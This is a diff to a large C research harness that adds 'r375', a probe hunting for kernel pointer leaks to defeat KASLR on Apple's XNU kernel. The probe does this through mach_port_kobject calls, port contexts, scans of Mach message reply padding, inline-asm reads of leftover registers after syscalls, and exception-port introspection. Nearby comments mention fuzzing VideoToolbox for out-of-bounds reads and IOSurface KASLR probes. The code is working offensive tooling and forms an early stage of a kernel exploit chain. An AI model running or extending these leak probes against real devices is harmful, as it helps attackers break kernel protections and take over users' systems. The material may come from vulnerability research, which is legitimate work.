@@ -15902,6 +15902,254 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r375: Unconventional KASLR leak: mach ports, msg padding, register residue.
+ * 1) mach_port_kobject / mach_port_kernel_object on various ports.
+ * 2) mach_port_get_context on task/thread/host ports.
+ * 3) Mach message reply with oversized buffer — scan padding.
+ * 4) Register residue after syscalls via inline asm.
+ * 5) Exception port introspection.
+ */
+static void r375_probe(void) {
+    rlog("\n=== r375: Unconventional KASLR Leak Vectors ===\n\n");
+    fflush(stdout);
+
+    kern_return_t kr;
+
+    /* ---- Part 1: mach_port_kobject ---- */
+    rlog("--- Part 1: mach_port_kobject on system ports ---\n");
+    fflush(stdout);
+
+    typedef kern_return_t (*mpko_t)(ipc_space_t, mach_port_name_t,
+        natural_t*, mach_vm_address_t*);
+    typedef kern_return_t (*mpko_desc_t)(ipc_space_t, mach_port_name_t,
+        natural_t*, mach_vm_address_t*, char**);
+
+    mpko_t kobject_fn = (mpko_t)dlsym(RTLD_DEFAULT, "mach_port_kobject");
+    mpko_desc_t kobject_desc_fn = (mpko_desc_t)dlsym(RTLD_DEFAULT,
+        "mach_port_kobject_description");
+
+    mach_port_t task = mach_task_self();
+    mach_port_t host = mach_host_self();
+    mach_port_t thread = mach_thread_self();
+
+    mach_port_t ports_to_check[] = {task, host, thread};
+    const char *port_names[] = {"task_self", "host_self", "thread_self"};
+
+    for (int i = 0; i < 3; i++) {
+        if (kobject_fn) {
+            natural_t kotype = 0;
+            mach_vm_address_t kaddr = 0;
+            kr = kobject_fn(task, ports_to_check[i], &kotype, &kaddr);
+            rlog("  kobject(%s): kr=0x%x type=%u addr=0x%llx",
+                port_names[i], kr, kotype, (unsigned long long)kaddr);
+            if (kr == KERN_SUCCESS && kaddr) {
+                if ((kaddr >> 36) == 0xFFFFFFF0 || (kaddr >> 36) == 0xFFFFFFF1)
+                    rlog(" [KTEXT!]");
+                else if ((kaddr >> 40) == 0xFFFFFF)
+                    rlog(" [KHEAP!]");
+            }
+            rlog("\n");
+        }
+        if (kobject_desc_fn) {
+            natural_t kotype = 0;
+            mach_vm_address_t kaddr = 0;
+            char *desc = NULL;
+            kr = kobject_desc_fn(task, ports_to_check[i], &kotype, &kaddr, &desc);
+            rlog("  kobject_desc(%s): kr=0x%x addr=0x%llx desc=%s\n",
+                port_names[i], kr, (unsigned long long)kaddr,
+                desc ? desc : "(null)");
+        }
+    }
+
+    /* Try mach_port_kobject on IOKit ports */
+    void *iokitH = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
+    typedef kern_return_t (*ioMasterPort_t)(mach_port_t, mach_port_t*);
+    ioMasterPort_t ioMP = (ioMasterPort_t)dlsym(iokitH, "IOMainPort");
+    if (!ioMP) ioMP = (ioMasterPort_t)dlsym(iokitH, "IOMasterPort");
+    if (ioMP) {
+        mach_port_t master = 0;
+        kr = ioMP(0, &master);
+        if (kr == KERN_SUCCESS && master && kobject_fn) {
+            natural_t kotype = 0;
+            mach_vm_address_t kaddr = 0;
+            kr = kobject_fn(task, master, &kotype, &kaddr);
+            rlog("  kobject(IOMainPort): kr=0x%x type=%u addr=0x%llx\n",
+                kr, kotype, (unsigned long long)kaddr);
+        }
+    }
+
+    /* ---- Part 2: mach_port_get_context ---- */
+    rlog("\n--- Part 2: mach_port_get_context ---\n");
+    fflush(stdout);
+
+    for (int i = 0; i < 3; i++) {
+        mach_port_context_t ctx = 0;
+        kr = mach_port_get_context(task, ports_to_check[i], &ctx);
+        rlog("  get_context(%s): kr=0x%x ctx=0x%llx",
+            port_names[i], kr, (unsigned long long)ctx);
+        if (kr == KERN_SUCCESS && ctx) {
+            if ((ctx >> 36) == 0xFFFFFFF0 || (ctx >> 36) == 0xFFFFFFF1)
+                rlog(" [KTEXT!]");
+            else if ((ctx >> 40) == 0xFFFFFF)
+                rlog(" [KHEAP!]");
+        }
+        rlog("\n");
+    }
+
+    /* ---- Part 3: Mach message padding scan ---- */
+    rlog("\n--- Part 3: Mach message reply padding scan ---\n");
+    fflush(stdout);
+
+    /* Send a simple request to host_self and check reply buffer */
+    struct {
+        mach_msg_header_t hdr;
+        uint8_t pad[4096];
+    } msg_buf;
+    memset(&msg_buf, 0xAA, sizeof(msg_buf));
+
+    /* host_info is a simple MIG call that returns a reply */
+    mach_msg_header_t *hdr = &msg_buf.hdr;
+    hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
+    hdr->msgh_size = sizeof(mach_msg_header_t) + 16;
+    hdr->msgh_remote_port = host;
+    hdr->msgh_local_port = mig_get_reply_port();
+    hdr->msgh_id = 200; /* host_info */
+
+    /* Write host_info request body */
+    uint32_t *body = (uint32_t*)(hdr + 1);
+    body[0] = HOST_BASIC_INFO; /* flavor */
+    body[1] = HOST_BASIC_INFO_COUNT; /* count */
+
+    kr = mach_msg(hdr,
+        MACH_SEND_MSG | MACH_RCV_MSG,
+        hdr->msgh_size, sizeof(msg_buf),
+        hdr->msgh_local_port, 1000, MACH_PORT_NULL);
+
+    rlog("  mach_msg: kr=0x%x reply_id=%d reply_size=%u\n",
+        kr, hdr->msgh_id, hdr->msgh_size);
+
+    if (kr == KERN_SUCCESS) {
+        /* Scan the ENTIRE buffer for kernel pointers */
+        int kptr_found = 0;
+        for (size_t off = 0; off + 8 <= sizeof(msg_buf); off += 4) {
+            uint64_t v; memcpy(&v, (uint8_t*)&msg_buf + off, 8);
+            if ((v >> 36) == 0xFFFFFFF0 || (v >> 36) == 0xFFFFFFF1) {
+                rlog("  *** MSG +0x%zx: 0x%llx [KTEXT!] ***\n", off, (unsigned long long)v);
+                kptr_found++;
+            } else if ((v >> 40) == 0xFFFFFF && v != 0xFFFFFFFFFFFFFFFF
+                       && v != 0xAAAAAAAAAAAAAAAAULL) {
+                rlog("  MSG +0x%zx: 0x%llx [KHEAP?]\n", off, (unsigned long long)v);
+                kptr_found++;
+            }
+            if (kptr_found >= 20) break;
+        }
+        /* Check how much was actually written (vs our 0xAA fill) */
+        int last_written = 0;
+        for (int off = sizeof(msg_buf) - 1; off >= 0; off--) {
+            if (((uint8_t*)&msg_buf)[off] != 0xAA) { last_written = off; break; }
+        }
+        rlog("  Last non-0xAA byte at offset: %d (msg_size=%u)\n",
+            last_written, hdr->msgh_size);
+    }
+
+    /* ---- Part 4: Register residue scan after syscalls ---- */
+    rlog("\n--- Part 4: Register residue after syscalls ---\n");
+    fflush(stdout);
+
+    /* After getpid() syscall, check caller-saved registers */
+    uint64_t x0_val, x1_val, x9_val, x10_val, x11_val, x12_val, x13_val, x14_val, x15_val;
+
+    __asm__ volatile(
+        "mov x16, #20\n"  /* SYS_getpid */
+        "svc #0x80\n"
+        "mov %0, x0\n"
+        "mov %1, x1\n"
+        "mov %2, x9\n"
+        "mov %3, x10\n"
+        "mov %4, x11\n"
+        "mov %5, x12\n"
+        "mov %6, x13\n"
+        "mov %7, x14\n"
+        "mov %8, x15\n"
+        : "=r"(x0_val), "=r"(x1_val), "=r"(x9_val), "=r"(x10_val),
+          "=r"(x11_val), "=r"(x12_val), "=r"(x13_val), "=r"(x14_val),
+          "=r"(x15_val)
+        :
+        : "x0", "x1", "x9", "x10", "x11", "x12", "x13", "x14", "x15",
+          "x16", "x17", "memory"
+    );
+
+    rlog("  After getpid:\n");
+    rlog("    x0=0x%llx x1=0x%llx\n", (unsigned long long)x0_val, (unsigned long long)x1_val);
+    rlog("    x9=0x%llx x10=0x%llx x11=0x%llx\n",
+        (unsigned long long)x9_val, (unsigned long long)x10_val, (unsigned long long)x11_val);
+    rlog("    x12=0x%llx x13=0x%llx x14=0x%llx x15=0x%llx\n",
+        (unsigned long long)x12_val, (unsigned long long)x13_val,
+        (unsigned long long)x14_val, (unsigned long long)x15_val);
+
+    int kfound = 0;
+    uint64_t regs[] = {x0_val, x1_val, x9_val, x10_val, x11_val, x12_val, x13_val, x14_val, x15_val};
+    for (int r = 0; r < 9; r++) {
+        if ((regs[r] >> 36) == 0xFFFFFFF0 || (regs[r] >> 36) == 0xFFFFFFF1) {
+            rlog("  *** KTEXT in register! ***\n");
+            kfound++;
+        }
+    }
+
+    /* Try after mach_absolute_time (a commpage call that might leak) */
+    __asm__ volatile(
+        "mov x16, #-3\n"  /* mach_absolute_time trap */
+        "svc #0x80\n"
+        "mov %0, x0\n"
+        "mov %1, x1\n"
+        "mov %2, x9\n"
+        "mov %3, x10\n"
+        : "=r"(x0_val), "=r"(x1_val), "=r"(x9_val), "=r"(x10_val)
+        :
+        : "x0", "x1", "x9", "x10", "x16", "x17", "memory"
+    );
+    rlog("  After mach_absolute_time:\n");
+    rlog("    x0=0x%llx x1=0x%llx x9=0x%llx x10=0x%llx\n",
+        (unsigned long long)x0_val, (unsigned long long)x1_val,
+        (unsigned long long)x9_val, (unsigned long long)x10_val);
+
+    /* ---- Part 5: Exception port introspection ---- */
+    rlog("\n--- Part 5: Exception ports ---\n");
+    fflush(stdout);
+
+    exception_mask_t masks[32];
+    mach_port_t eports[32];
+    exception_behavior_t behaviors[32];
+    thread_state_flavor_t flavors[32];
+    mach_msg_type_number_t ecnt = 32;
+    kr = task_get_exception_ports(task,
+        EXC_MASK_ALL, masks, &ecnt, eports, behaviors, flavors);
+    rlog("  task_get_exception_ports: kr=0x%x count=%u\n", kr, ecnt);
+    for (unsigned i = 0; i < ecnt; i++) {
+        if (eports[i]) {
+            rlog("    [%u] port=%u mask=0x%x behavior=%d\n",
+                i, eports[i], masks[i], behaviors[i]);
+            if (kobject_fn) {
+                natural_t kotype = 0;
+                mach_vm_address_t kaddr = 0;
+                kr = kobject_fn(task, eports[i], &kotype, &kaddr);
+                if (kr == KERN_SUCCESS && kaddr) {
+                    rlog("      kobject: type=%u addr=0x%llx", kotype, (unsigned long long)kaddr);
+                    if ((kaddr >> 36) == 0xFFFFFFF0)
+                        rlog(" [KTEXT!]");
+                    else if ((kaddr >> 40) == 0xFFFFFF)
+                        rlog(" [KHEAP!]");
+                    rlog("\n");
+                }
+            }
+        }
+    }
+
+    if (iokitH) dlclose(iokitH);
+    rlog("\n=== r375 complete ===\n");
+    fflush(stdout);
+}
+
 /* r374: Deep mach_memory_info dump + zone address scan.
  * mach_memory_info returned 388 entries in r373 but only .site was scanned.
  * This probe dumps ALL fields of every entry looking for kernel pointers.
@@ -57177,6 +57425,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 378) {
+            rlog("*** rounds=378: Unconventional KASLR Leak Vectors ***\n");
+            rlog("  mach_port_kobject, msg padding, register residue,\n");
+            rlog("  exception ports for kernel pointer leaks.\n\n");
+            fflush(stdout);
+            r375_probe();
+            goto done;
+        }
         if (rounds == 377) {
             rlog("*** rounds=377: Deep mach_memory_info Dump ***\n");
             rlog("  Scan ALL fields of zone info + memory info for kptrs.\n");
@@ -59404,7 +59660,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -69246,7 +69502,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
